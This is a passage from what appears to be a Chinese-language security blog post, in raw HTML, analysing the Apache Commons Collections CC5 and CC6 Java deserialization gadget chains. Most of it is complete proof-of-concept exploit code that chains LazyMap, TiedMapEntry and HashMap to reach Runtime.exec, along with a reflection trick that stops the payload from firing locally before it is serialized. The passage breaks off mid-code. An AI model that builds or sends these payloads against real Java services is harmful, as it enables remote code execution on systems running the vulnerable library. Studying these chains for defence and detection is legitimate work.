class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Field valF = BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valF.setAccessible(<span class="hljs-keyword">true</span>);<br>        valF.set(badAttributeValueExpException,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="Pre-5"><a href="#Pre-5" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-5"><a href="#关键类-5" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><p>CC6 仍然和 CC5 思路相同，前半部分都是 CC1，CC5 用了<code>TiedMapEntry.toString</code>方法进而调用其<code>getValue</code>，触发<code>LazyMap.get</code>后 RCE</p><p>CC6 使用的是<code>TiedMapEntry.hashcode</code>方法来触发的与 CC5<code>toString</code>一样调用其<code>getValue</code>，进而触发<code>LazyMap.get</code>RCE</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">//                , new ConstantTransformer(1)</span><br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();//CC5</span><br>        tiedMapEntry.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的，我们需要一个类来调用其<code>hashCode</code>方法，CC6 使用的是<code>HashMap.hash</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里 key 并不可控，还得找调用其<code>hash</code>方法，还是<code>HashMap</code>中的<code>put</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在需要找到一个调用了<code>HashMap.put</code>并且第一个参数可控的方法，最终找到了<code>HashSet</code>复写点中的<code>put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HashSet</span><span class="hljs-params">()</span> </span>&#123;<br>       map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span>&#123;<br>       ...<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>           <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>               E e = (E) s.readObject();<br>           map.put(e, PRESENT);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><code>e</code>如何控制呢，看看<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>    <span class="hljs-comment">// Write out any hidden serialization magic</span><br>    s.defaultWriteObject();<br><br>    <span class="hljs-comment">// Write out HashMap capacity and load factor</span><br>    s.writeInt(map.capacity());<br>    s.writeFloat(map.loadFactor());<br><br>    <span class="hljs-comment">// Write out size</span><br>    s.writeInt(map.size());<br><br>    <span class="hljs-comment">// Write out all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (E e : map.keySet())<br>        s.writeObject(e);<br>&#125;<br></code></pre></td></tr></table></figure><p>是通过<code>map.keySet</code>增强 for 写入的，因此<code>HashMap</code>中要调用<code>keySet</code>方法并传入任意值</p><p>整个链条清晰了，我们注意到<code>HashMap.put</code>调用<code>HashMap.hash</code>的过程很熟悉，没错正是<code>URLDNS</code>链中的内容，其实已经就可以通过<code>HashMap.readObject</code>来调用了</p><p>参考：<a href="https://blog.csdn.net/weixin_43263451/article/details/126073035">1</a> <a href="https://blog.csdn.net/weixin_43610673/article/details/125079601">2</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URLDNS: HashMap.readObject-&gt;HashMap.hash</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">...</span><br><span class="hljs-function">            <span class="hljs-title">for</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++)</span> </span>&#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因此先来个简单的 poc(URLDNS 式，原谅我这样备注它)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br><span class="hljs-comment">//        ois.readObject();</span><br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里就完了？其实还是编写过程中没有到达<code>ois.readObject</code>就已经触发，也就是说没有规避到本地触发，不信可以注释<code>ois.readObject</code>我们发现压根没有反序列化 RCE 成功，那就加一个假链，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个反射修改传入的是<code>Transformer[]</code>，不需要再 chain 一下了</p><p>现在就是好了，但是为什么没有执行成功，按着 p 牛思路调试，断点<code>readObject</code>步入，<code>LazyMap.get</code>方法内</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png"></p><p>if 判断进去了而没有调用<code>map.get</code>，这个<code>LazyMap</code>在哪里存了值呢，正如 yso 利用方式<code>HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</code>，也就是我们在规避本地触发的过程中，我们也调用到了<code>HashMap.put</code>!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><p>这就导致了<code>yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash </code>在这里也被调用了一次，而且因为规避用的<code>fakeChainedTransform</code>在这里产生了影响而没有触发命令执行，解决方法也简单，在序列化前移除这个键</p><h3 id="Gadget-5"><a href="#Gadget-5" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="①p-牛简化"><a href="#①p-牛简化" class="headerlink" title="①p 牛简化"></a>①p 牛简化</h4><p><code>HashMap+HashMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 